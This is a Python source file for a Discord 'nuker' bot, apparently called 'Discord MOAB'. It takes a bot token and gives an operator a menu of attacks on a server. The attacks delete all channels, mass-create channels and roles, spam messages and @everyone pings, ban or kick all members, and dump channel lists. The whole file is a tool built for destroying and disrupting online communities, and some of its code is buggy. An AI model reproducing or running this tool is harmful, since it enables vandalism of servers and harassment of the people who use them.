# Made by: Koberxx
# Do NOT remove the message above.

from logging import exception
import discord
from discord.errors import Forbidden
from discord.ext import commands
import time
import json
import os
import colorama
from colorama import Fore, init
import sys

colorama.init(convert=True)
os.system("color")


#token = open("bot_token.txt", "r")
bot = commands.Bot(command_prefix="_")
def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f""" \r [#]Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)

m = Fore.MAGENTA
w = Fore.WHITE
r = Fore.RED

errors = []


token = None

# Start-up
while True:
    print()
    request_token = input(Fore.MAGENTA + "[*] Token: ")
    token = request_token
    Spinner()
    time.sleep(2)
    os.system("cls")
    break
# 

@bot.event
async def on_ready():
    global token
    print(Fore.MAGENTA + """
 ________  _______   ________  ________  _______   ___  __    _______   _______   ________  _______   ________     
|\   __  \|\  ___ \ |\   __  \|\   ____\|\  ___ \ |\  \|\  \ |\  ___ \ |\  ___ \ |\   __  \|\  ___ \ |\   __  \    
\ \  \|\  \ \   __/|\ \  \|\  \ \  \___|\ \   __/|\ \  \/  /|\ \   __/|\ \   __/|\ \  \|\  \ \   __/|\ \  \|\  \   
 \ \   ____\ \  \_|/_\ \   __  \ \  \    \ \  \_|/_\ \   ___  \ \  \_|/_\ \  \_|/_\ \   ____\ \  \_|/_\ \   _  _\  
  \ \  \___|\ \  \_|\ \ \  \ \  \ \  \____\ \  \_|\ \ \  \\ \  \ \  \_|\ \ \  \_|\ \ \  \___|\ \  \_|\ \ \  \\  \| 
   \ \__\    \ \_______\ \__\ \__\ \_______\ \_______\ \__\\ \__\ \_______\ \_______\ \__\    \ \_______\ \__\\ _\ 
    \|__|     \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|\|_______|\|_______|\|__|     \|_______|\|__|\|__|
                                                                                                                   
                                                     """)

    
    print()
    print(f"{w} Waiting for {m}start {w}command...")
    

@bot.command()
async def start(ctx):
    await ctx.channel.purge(limit=1)
    start_time = time.time()
    os.system("cls")
    while True:
        print(f"""{m}

 ________  _______   ________  ________  _______   ___  __    _______   _______   ________  _______   ________     
|\   __  \|\  ___ \ |\   __  \|\   ____\|\  ___ \ |\  \|\  \ |\  ___ \ |\  ___ \ |\   __  \|\  ___ \ |\   __  \    
\ \  \|\  \ \   __/|\ \  \|\  \ \  \___|\ \   __/|\ \  \/  /|\ \   __/|\ \   __/|\ \  \|\  \ \   __/|\ \  \|\  \   
 \ \   ____\ \  \_|/_\ \   __  \ \  \    \ \  \_|/_\ \   ___  \ \  \_|/_\ \  \_|/_\ \   ____\ \  \_|/_\ \   _  _\  
  \ \  \___|\ \  \_|\ \ \  \ \  \ \  \____\ \  \_|\ \ \  \\ \  \ \  \_|\ \ \  \_|\ \ \  \___|\ \  \_|\ \ \  \\  \| 
   \ \__\    \ \_______\ \__\ \__\ \_______\ \_______\ \__\\ \__\ \_______\ \_______\ \__\    \ \_______\ \__\\ _\ 
    \|__|     \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|\|_______|\|_______|\|__|     \|_______|\|__|\|__|
                                                                                                                   
                                                     

            {r}[{w}+{r}]{m} Discord MOAB started in token: {w}{token}
            {r}[{w}+{r}]{m} Guild: {w}{ctx.guild.id}

                        {w}[*] Options: 
                       -----------------------------------------------------------------------------------------
                       | - 1. Nuke.                          |  - 7. Spam an amount of messages.               |      
                       | - 2. Spam channels.                 |  - 8. Create a role with the given name.        |
                       | - 3. Get server info.               |  - 9. Delete the given role.                    | 
                       | - 4. Ban everyone.                  |  - 10. Spam @everyone                           |     
                       | - 5. Kick everyone                  |  - 11. Dump all channels from the server        |
                       |                                     |  - 11. Dump all voice channels from the server  | 
                       |                                     |  - 13. Exit form the discord MOAB               |
                       |                                     |                                                 |
                       |                                     |                                                 |
                       |                                     |                                                 |
                       -----------------------------------------------------------------------------------------
        """)

        option = input(f"{w}Type of {m}attack:{r} ")

        if option == "1":
            print()
            motive = input("> Message after the nuke: ")
            print(f"[*] Starting nuke at {ctx.guild.name}...")
            guild = ctx.guild
            channel = discord.utils.get(ctx.guild.channels, name="Server Nuked")
            channel_id = bot.get_channel(channel)

            channels = ctx.guild.channels
            guild = ctx.guild
            for channel in channels:
                try:
                    await channel.delete()
                    print(f"{w}[{m}+{w}]{m} {channel.name} {r} has been {w}deleted {r} successfully.")
                

                except Exception as error: 
                    print(f"{channel.name} failed to remove.")
                    print(error)
                    errors.append(error)
                    with open("error_log.txt", "w") as file:
                        json.dump(errors, file)
            nuke_channel = await guild.create_text_channel("server-nuked")
            await nuke_channel.send(motive)
            os.system("cls")


        if option == "2":
            channelspam_amount = input("Amount of channels: ")
            channelspam_name = input("Name of the channel: ")
            print("[*] Making some spam...")
            guild = ctx.guild
            try:
                for i in range(int(channelspam_amount)):
                    await guild.create_text_channel(channelspam_name)
                print(f"[+] {channelspam_amount} channels with the name: {channelspam_name} has been created successfully.")
            except Exception as error:
                print(error)

            os.system("cls")

        if option == "3":
            print(f"""
            
                    Server Name: {ctx.guild.name}
                    Server ID: {ctx.guild.id}
                    Server Owner: {ctx.guild.owner}
                    Server Region: {ctx.guild.region}

            """)
            time.sleep(3)
            os.system("cls")


        
        if option == "4":
            print("[*] Banning all members...")
            members = ctx.guild.members
            try:
                await members.ban(reason=None)
            except Exception as error:
                print("[-] " + error)
            print(f"[+] All members banned in {ctx.guild.name}")
            os.system("cls")

        
        if option == "5":
            print()
            print("[*] Trying to kick all members...")
            members = ctx.guild.members
            try:
                await members.kick(reason=None)
            except Exception as error:
                print("[-] " + error)
            print()    
            print(f"[+] All members kicked successfully at {ctx.guild.name}")
            os.system("cls")


        if option == "7":
            spam_amount = input("Amount of messages: ")
            spam_message = input("The message: ")
            print("[*] Spamming...")

            for i in range(int(spam_amount)):
                await ctx.send(spam_message)
            print(f"[+] {spam_amount} Messages sended successfully.")
            os.system("cls")
        
        if option == "8":
            print("[*] Trying to create roles...")
            createRole_amount = input("Amount of roles: ")
            createRole_name = input("Name of the roles: ")
            guild = ctx.guild
            for i in range(int(createRole_amount)):
                await guild.create_role(name=createRole_name)
            print(f"[+] {createRole_amount} roles with the name: {createRole_name} has been created succesfully at: {ctx.guild.name}")
            os.system("cls")
        
        if option == "9":
            deleteRole_name = input("Name of the target role: ")
            print("[*] Trying to delete the role...")

            role_obj = discord.utils.get(ctx.message.guild.roles, name=deleteRole_name)
            try:
                await role_obj.delete()
                print(f"[+] All roles in {ctx.guild.name} with the name: {deleteRole_name} has been removed successfully.")
            except Exception as error:
                print("[-] " + error)
            os.system("cls")
        

        if option == "10":
            print(f"{w}[{m}*{w}] {r} Starting bother...")
            try:
                for i in range(10):
                    await ctx.send("@everyone")
            except Exception as error:
                print(error)
            print("[+] Bother complete.")
            os.system("cls")
        
        if option == "11":

            try:
                text_channel_list = []
                for guild in bot.guilds:
                    for channel in guild.text_channels:
                        text_channel_list.append(str(channel))
                with open("dumped_channels.txt", "w") as file:
                    json.dump(text_channel_list, file)
                
            except Exception as error:
                print(error)
                errors.append(error)
                with open("error_log.txt", "w") as file:
                    json.dump(errors, file)
            print(f"[+] All channels in {ctx.guild.name} has been dumped succesfully to dumped_channels.txt")
            os.system("cls")
        
        if option == "12":

            try:
                voice_channel_list = []
                for guild in bot.guilds:
                    for channel in guild.voice_channels:
                        voice_channel_list.append(str(channel))
                with open("dumped_voice_channels.txt", "w") as file:
                    json.dump(voice_channel_list, file)
                print(f"[+] All voice channels of {ctx.guild.name} has been dumped successfully to dumped_voice_channels.txt")
            except Exception as error:
                print(error)
                errors.append(error)
                with open("error_log.txt", "w") as file:
                    json.dump(errors, file)
            if guild.voice_channels == None:
                print("[-] There isn't any voice channel in the server.")
            os.system("cls")
        
        if option == "13":
            os.system("cls")
            break
            

        end_time = time.time()
        time.sleep(3)
        print(f"Attack finished in: {end_time} seconds.")


    

bot.run(token)
